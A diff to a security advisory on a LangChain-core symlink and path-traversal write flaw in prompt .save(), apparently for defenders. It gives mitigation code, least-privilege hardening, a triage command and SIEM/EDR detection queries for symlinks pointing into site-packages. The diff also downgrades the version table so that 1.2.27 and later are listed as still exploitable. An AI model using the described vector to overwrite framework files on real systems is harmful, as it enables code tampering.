@@ -321,8 +326,8 @@ This vulnerability analysis is strictly scoped to the following parameters:
 
 *(Note: Redundant sections from the draft have been consolidated to provide a single, unified hardening guide).*
 
-#### **3.1 Application-Layer Mitigation (Virtual Patching)**
-Organizations unable to immediately upgrade to `langchain-core >= 1.2.27` due to dependency constraints must implement application-layer compensating controls. The recommended mitigation is to encapsulate all calls to framework file operations within a strict validation wrapper that neutralizes **CWE-59** and **CWE-22** exposure.
+#### **3.1 Application‑Layer Mitigation (Virtual Patching)**
+Organizations unable to immediately upgrade to a patched version due to dependency constraints must implement application‑layer compensating controls. The recommended mitigation is to encapsulate all calls to framework file operations within a strict validation wrapper that neutralizes **CWE‑59** and **CWE‑22** exposure.
 
 ```python
 import os
@@ -357,11 +362,11 @@ def secure_orchestration_path(safe_root: str, untrusted_input: str) -> Path:
 # prompt.save(str(safe_path))
 ```
 
-#### **3.2 Infrastructure Hardening (Defense-in-Depth)**
-To systematically prevent this class of vulnerability, enforce **Filesystem Least Privilege**. The "Confused Deputy" vector relies on the application having write permissions to its own source code. 
+#### **3.2 Infrastructure Hardening (Defense‑in‑Depth)**
+To systematically prevent this class of vulnerability, enforce **Filesystem Least Privilege**. The "Confused Deputy" vector relies on the application having write permissions to its own source code.
 
-* **Immutable Runtimes:** Ensure the Python `site-packages` directory is owned by `root`, and the executing application user (e.g., `www-data`, `app-user`) is restricted to **Read-Only** access. This neutralizes the vector by removing the underlying OS permissions required to modify the framework.
-* **Symlink-Aware Extraction:** When processing user-provided archives (ZIP/TAR), mandate the use of `filter='data'` (introduced in Python 3.12) or an equivalent mechanism to safely discard symbolic links during the extraction process.
+* **Immutable Runtimes:** Ensure the Python `site-packages` directory is owned by `root`, and the executing application user (e.g., `www-data`, `app-user`) is restricted to **Read‑Only** access. This neutralizes the vector by removing the underlying OS permissions required to modify the framework.
+* **Symlink‑Aware Extraction:** When processing user‑provided archives (ZIP/TAR), mandate the use of `filter='data'` (introduced in Python 3.12) or an equivalent mechanism to safely discard symbolic links during the extraction process.
 * **Mandatory Access Control (MAC):** Implement an AppArmor or SELinux profile that explicitly denies the application process from writing to any directory containing `.py` files.
 
 ---
@@ -377,7 +382,7 @@ Monitor for unauthorized modifications to framework dependencies. Any write oper
 * `**/site-packages/langchain_community/*.py`
 
 #### **4.2 Forensic Filesystem Triage**
-Execute the following command on application hosts to identify suspicious symbolic links within user-controlled directories that may be staging an attack:
+Execute the following command on application hosts to identify suspicious symbolic links within user‑controlled directories that may be staging an attack:
 ```bash
 # Identify symlinks in upload directories attempting to resolve to core libraries
 find /path/to/uploads -type l -ls | grep "site-packages"
@@ -386,7 +391,7 @@ find /path/to/uploads -type l -ls | grep "site-packages"
 #### **4.3 SIEM / EDR Search Queries**
 To identify historical exploitation or active poisoning attempts, deploy the following detection logic:
 
-**I. Splunk (File Integrity & Process Lineage)**
+**I. Splunk (File Integrity & Process Lineage)**  
 Detects a Python process modifying the `site-packages` directory correlating with the recent processing of a configuration file.
 ```spl
 index=os_logs sourcetype=sysmon_data (EventCode=11 OR EventCode=23) 
@@ -398,15 +403,15 @@ index=os_logs sourcetype=sysmon_data (EventCode=11 OR EventCode=23)
 | table _time, host, User, TargetFilename, CommandLine
 ```
 
-**II. CrowdStrike Falcon (Custom IOA)**
-Detects the creation of symbolic links targeting the Python virtual environment from a web-server user context.
+**II. CrowdStrike Falcon (Custom IOA)**  
+Detects the creation of symbolic links targeting the Python virtual environment from a web‑server user context.
 ```kql
 (OperationType=SymlinkCreate) AND 
 (TargetFileName="*/site-packages/*") AND 
 (User="www-data" OR User="nobody" OR User="app-user")
 ```
 
-**III. Microsoft Defender for Endpoint (KQL)**
+**III. Microsoft Defender for Endpoint (KQL)**  
 Identifies the Confused Deputy pattern where the orchestration application resolves a path escaping its designated execution sandbox.
 ```kql
 DeviceFileEvents
@@ -425,17 +430,17 @@ DeviceFileEvents
 | Version Range | Risk Posture | Mitigation State |
 | :--- | :--- | :--- |
 | **< 1.2.19** | **CRITICAL** | Fully Vulnerable. Both Read and Write primitives exposed. |
-| **1.2.19 - 1.2.21** | **HIGH** | Partial Mitigation. Read-side hardened via PR #36471 (CVE-2026-34070); Write-side remains exposed. |
-| **1.2.22 - 1.2.26** | **CRITICAL** | Undocumented Mitigation State. Bypassable Read-side (CVE-2026-34070); Unvalidated Write-side primitive active. |
-| **1.2.27+** | **PATCHED** | Emergency Hardening (PR #36585) addresses `.save()` symlink resolution. |
+| **1.2.19 – 1.2.21** | **HIGH** | Partial Mitigation. Read‑side hardened via PR #36471 (CVE‑2026‑34070); Write‑side remains exposed. |
+| **1.2.22 – 1.2.26** | **CRITICAL** | Undocumented Mitigation State. Bypassable Read‑side (CVE‑2026‑34070); Unvalidated Write‑side primitive active. |
+| **1.2.27 – latest** | **HIGH** | Incomplete Remediation. Read‑side symlink bypass still exploitable; Write primitive remains unpatched. |
 
-**Note:** Environments operating versions 1.2.22 through 1.2.26 face elevated risk due to a potential false sense of security derived from the partial read-side mitigation, while the critical write-side execution primitive remains fully exploitable.
+**Note:** Environments operating versions 1.2.22 through the latest face elevated risk due to a potential false sense of security derived from the partial read‑side mitigation, while the critical write‑side execution primitive remains fully exploitable in all tested versions.
 
 ---
 
 #### Appendix 6: Forensic Artifacts and Demonstration Logs
 
-This section provides visual artifacts confirming the execution methodologies and tracking the vulnerability lifecycles across documented versions of the LangChain-Core framework.
+This section provides visual artifacts confirming the execution methodologies and tracking the vulnerability lifecycles across documented versions of the LangChain‑Core framework.
 
 ---
 
@@ -445,8 +450,8 @@ This section provides visual artifacts confirming the execution methodologies an
 * **Summary:** Simulates a production deployment (Docker `python:3.12-slim`). Demonstrates a remote interaction supplying a symlink targeting internal library directories. The `.save()` function blindly executes the operation, overwriting `langchain_core/__init__.py` and achieving persistent scope alteration.
 
 **Supporting Files:**
-* [Execution Logs (txt)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain-Remote-Exploit-cast-TERMINAL-OUTPUT.txt) 
-* [Asciinema Recording (cast)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain-Remote-Exploit.cast) 
+* [Execution Logs (txt)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain-Remote-Exploit-cast-TERMINAL-OUTPUT.txt)
+* [Asciinema Recording (cast)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain-Remote-Exploit.cast)
 
 <video width="100%" controls>
   <source src="https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain-Remote-Exploit.mp4" type="video/mp4">
@@ -461,8 +466,8 @@ This section provides visual artifacts confirming the execution methodologies an
 * **Summary:** Establishes the baseline vulnerability state prior to final vendor remediation. Confirms the presence of the unvalidated write primitive in `.save()` and improper symlink resolution within a standard v1.2.25 deployment.
 
 **Supporting Files:**
-* [Execution Logs (txt)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.25_vulnerability-cast-TERMINAL-OUTPUT.txt) 
-* [Asciinema Recording (cast)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.25_vulnerability.cast) 
+* [Execution Logs (txt)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.25_vulnerability-cast-TERMINAL-OUTPUT.txt)
+* [Asciinema Recording (cast)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.25_vulnerability.cast)
 
 <video width="100%" controls>
   <source src="https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.25_vulnerability.mp4" type="video/mp4">
@@ -477,8 +482,8 @@ This section provides visual artifacts confirming the execution methodologies an
 * **Summary:** Empirically demonstrates incomplete remediation. Tests the v1.2.26 production release following the initial read-side patch. Confirms that while `load_prompt_from_config` was hardened, the write primitive in `.save()` remained exploitable, necessitating independent tracking and advisory issuance.
 
 **Supporting Files:**
-* [Execution Logs (txt)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.26_vulnerability-cast-TERMINAL-OUTPUT.txt) 
-* [Asciinema Recording (cast)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.26_vulnerability.cast) 
+* [Execution Logs (txt)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.26_vulnerability-cast-TERMINAL-OUTPUT.txt)
+* [Asciinema Recording (cast)](https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.26_vulnerability.cast)
 
 <video width="100%" controls>
   <source src="https://raw.githubusercontent.com/JDP-Security/security-research-media/main/assets/LC/langchain_1.2.26_vulnerability.mp4" type="video/mp4">
